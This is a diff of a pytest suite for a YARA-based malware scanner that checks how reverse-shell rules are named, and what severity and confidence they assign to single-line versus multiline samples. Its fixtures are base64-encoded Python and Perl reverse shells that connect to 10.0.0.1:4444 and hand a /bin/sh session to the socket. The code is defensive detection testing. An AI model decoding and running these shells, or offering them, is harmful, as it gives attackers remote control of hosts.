@@ -132,7 +132,7 @@ def _webshell_fixture(name: str) -> str:
 
 def _has_rule(findings: list, rule_name: str) -> bool:
     """Return True when a finding message references a specific YARA rule."""
-    return any(rule_name in f.message for f in findings)
+    return any(f"YARA rule '{rule_name}'" in f.message for f in findings)
 
 
 # ── Core pipeline ────────────────────────────────────────────────────
@@ -654,7 +654,7 @@ class TestBuiltInMalwarePackaging:
     def test_builtin_reverse_shell_matches_complete_socket_shells(
         self, content: str, filename: str
     ) -> None:
-        assert _has_rule(_run_builtin(content, filename), "reverse_shell")
+        assert _has_rule(_run_builtin(content, filename), "reverse_shell_multiline")
 
     @pytest.mark.parametrize(
         "content, filename",
@@ -670,7 +670,7 @@ class TestBuiltInMalwarePackaging:
     def test_builtin_reverse_shell_ignores_plain_socket_clients(
         self, content: str, filename: str
     ) -> None:
-        assert not _has_rule(_run_builtin(content, filename), "reverse_shell")
+        assert not _has_rule(_run_builtin(content, filename), "reverse_shell_multiline")
 
     @pytest.mark.parametrize(
         "encoded, filename",
@@ -702,11 +702,11 @@ class TestBuiltInMalwarePackaging:
         self, encoded: str, filename: str
     ) -> None:
         content = base64.b64decode(encoded).decode()
-        assert not _has_rule(_run_builtin(content, filename), "reverse_shell")
+        assert not _has_rule(_run_builtin(content, filename), "reverse_shell_multiline")
 
     @pytest.mark.parametrize("single_line", [False, True])
     @pytest.mark.parametrize(
-        "encoded, filename, detected",
+        "encoded, filename",
         [
             (
                 "aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0"
@@ -714,7 +714,6 @@ class TestBuiltInMalwarePackaging:
                 "bi9zaCIsICItaSJdLCBzdGRpbj1zLmZpbGVubygpLCBzdGRvdXQ9cy5maWxlbm8oKSwgc3RkZXJyPXMuZmlsZW5v"
                 "KCkpCg==",
                 "socket_streams.py",
-                True,
             ),
             (
                 "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHByb3RvYnluYW1lKCJ0"
@@ -722,7 +721,6 @@ class TestBuiltInMalwarePackaging:
                 "Cm9wZW4gU1RESU4sICI8JlNPQ0tFVCI7Cm9wZW4gU1RET1VULCAiPiZTT0NLRVQiOwpvcGVuIFNUREVSUiwgIj4m"
                 "U09DS0VUIjsKZXhlYyAiL2Jpbi9zaCIsICItaSI7Cg==",
                 "perl_no_parens.pl",
-                True,
             ),
             (
                 "aW1wb3J0IHNvY2tldCwgc3VicHJvY2Vzcywgb3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNv"
@@ -731,7 +729,6 @@ class TestBuiltInMalwarePackaging:
                 "bi9zaCIsICItYyIsICJkYXRlIl0sIGNoZWNrPVRydWUpCnMuc2VuZGFsbChiImhlYWx0aGNoZWNrXG4iKQpzLmNs"
                 "b3NlKCkK",
                 "local_file_shell.py",
-                False,
             ),
             (
                 "aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0"
@@ -739,15 +736,23 @@ class TestBuiltInMalwarePackaging:
                 "dC5sb2ciLCAidysiKQpzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwgIi1jIiwgImRhdGUiXSwgc3RkaW49bG9n"
                 "ZmlsZS5maWxlbm8oKSwgc3Rkb3V0PWxvZ2ZpbGUuZmlsZW5vKCksIHN0ZGVycj1sb2dmaWxlLmZpbGVubygpKQo=",
                 "local_file_streams.py",
-                False,
             ),
         ],
     )
-    def test_socket_stream_relationships(self, encoded, filename, detected, single_line):
+    def test_socket_stream_relationships(self, encoded, filename, single_line):
         content = base64.b64decode(encoded).decode()
         if single_line:
             content = content.replace("\n", " " if filename.endswith(".pl") else "; ")
-        assert _has_rule(_run_builtin(content, filename), "reverse_shell") is detected
+        findings = _run_builtin(content, filename)
+        expected = "reverse_shell" if single_line else "reverse_shell_multiline"
+        assert _has_rule(findings, expected)
+        assert not _has_rule(
+            findings, "reverse_shell_multiline" if single_line else "reverse_shell"
+        )
+        for finding in findings:
+            if _has_rule([finding], expected):
+                assert finding.severity == ("CRITICAL" if single_line else "HIGH")
+                assert finding.confidence == (0.85 if single_line else 0.65)
 
     @pytest.mark.parametrize(
         "variant",
@@ -806,7 +811,106 @@ class TestBuiltInMalwarePackaging:
         else:
             content = content.replace("os.dup2", "wrapped=open(s.fileno(), 'r+')\nos.dup2", 1)
             content = content.replace("os.dup2(s.fileno()", "os.dup2(wrapped.fileno()")
-        assert _has_rule(_run_builtin(content, "uncertain.py"), "reverse_shell")
+        assert _has_rule(_run_builtin(content, "uncertain.py"), "reverse_shell_multiline")
+
+    @pytest.mark.parametrize("single_line", [False, True])
+    @pytest.mark.parametrize(
+        "variant, encoded",
+        [
+            (
+                "comprehension",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKW29zLmR1cDIocy5maWxlbm8oKSxmZCkg"
+                "Zm9yIGZkIGluICgwLDEsMildCnB0eS5zcGF3bigiL2Jpbi9zaCIpCg==",
+            ),
+            (
+                "direct_objects",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9z"
+                "aCIsIi1pIl0sc3RkaW49cyxzdGRvdXQ9cyxzdGRlcnI9cykK",
+            ),
+            (
+                "bare_shell",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLDApCm9z"
+                "LmR1cDIocy5maWxlbm8oKSwxKQpvcy5kdXAyKHMuZmlsZW5vKCksMikKcHR5LnNwYXduKCJzaCIpCg==",
+            ),
+            (
+                "usr_shell",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLDApCm9z"
+                "LmR1cDIocy5maWxlbm8oKSwxKQpvcy5kdXAyKHMuZmlsZW5vKCksMikKcHR5LnNwYXduKCIvdXNyL2Jpbi9iYXNo"
+                "IikK",
+            ),
+            (
+                "perl_system",
+                "dXNlIFNvY2tldDsKJGk9IjEwLjAuMC4xIjskcD00NDQ0Owpzb2NrZXQoU09DS0VULFBGX0lORVQsU09DS19TVFJF"
+                "QU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTsKY29ubmVjdChTT0NLRVQsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9u"
+                "KCRpKSkpOwpvcGVuKFNURElOLCI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwiPiZTT0NLRVQiKTsKb3BlbihTVERF"
+                "UlIsIj4mU09DS0VUIik7CnN5c3RlbSgiL2Jpbi9zaCAtaSIpOwo=",
+            ),
+            (
+                "loop",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKZm9yIGZkIGluICgwLDEsMik6IG9zLmR1"
+                "cDIocy5maWxlbm8oKSxmZCkKcHR5LnNwYXduKCIvYmluL2Jhc2giKQo=",
+            ),
+            (
+                "streams_reordered",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9z"
+                "aCIsIi1pIl0sc3RkZXJyPXMsc3RkaW49cyxzdGRvdXQ9cykK",
+            ),
+            (
+                "connect_gap",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQu"
+                "U09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKI3h4eHh4eHh4eHh4eHh4eHh4eHh4eHh4"
+                "eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4"
+                "eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4"
+                "eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4Cm9zLmR1cDIocy5maWxlbm8oKSww"
+                "KQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnB0eS5zcGF3bigic2giKQo=",
+            ),
+            (
+                "renamed_socket",
+                "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCmNvbm49c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2Nr"
+                "ZXQuU09DS19TVFJFQU0pCmNvbm4uY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKb3MuZHVwMihjb25uLmZpbGVu"
+                "bygpLDApCm9zLmR1cDIoY29ubi5maWxlbm8oKSwxKQpvcy5kdXAyKGNvbm4uZmlsZW5vKCksMikKcD1zdWJwcm9j"
+                "ZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK",
+            ),
+        ],
+    )
+    def test_reviewed_shell_forms_preserve_severity(self, variant, encoded, single_line):
+        # Payloads are decoded and scanned as text only, never executed.
+        content = base64.b64decode(encoded).decode()
+        if single_line:
+            content = content.replace("\n", " " if variant == "perl_system" else "; ")
+        findings = _run_builtin(content, "sample.pl" if variant == "perl_system" else "sample.py")
+        expected = "reverse_shell" if single_line else "reverse_shell_multiline"
+        matching = [f for f in findings if _has_rule([f], expected)]
+        assert matching
+        assert all(f.severity == ("CRITICAL" if single_line else "HIGH") for f in matching)
+        assert all(f.confidence == (0.85 if single_line else 0.65) for f in matching)
+        assert not _has_rule(
+            findings, "reverse_shell_multiline" if single_line else "reverse_shell"
+        )
+
+    @pytest.mark.parametrize("wrapper", ["flat", "function", "print"])
+    def test_local_file_shell_evidence_is_uncertain(self, wrapper):
+        content = (
+            _python_socket_shell_fixture()
+            .replace("os.dup2", 'log = open("client.log", "a")\nos.dup2', 1)
+            .replace("s.fileno()", "log.fileno()")
+        )
+        if wrapper == "function":
+            content = "def main():\n" + "\n".join("    " + line for line in content.splitlines())
+            content += '\nif __name__ == "__main__":\n    main()\n'
+        elif wrapper == "print":
+            content = content.replace("os.dup2", 'print("sent")\nos.dup2', 1)
+        findings = _run_builtin(content)
+        assert not _has_rule(findings, "reverse_shell")
+        matching = [f for f in findings if _has_rule([f], "reverse_shell_multiline")]
+        assert matching
+        assert all(f.severity == "HIGH" and f.confidence == 0.65 for f in matching)
 
     def test_extra_rules_still_match_with_builtin_malware_representation(self, tmp_path):
         _write_rule(
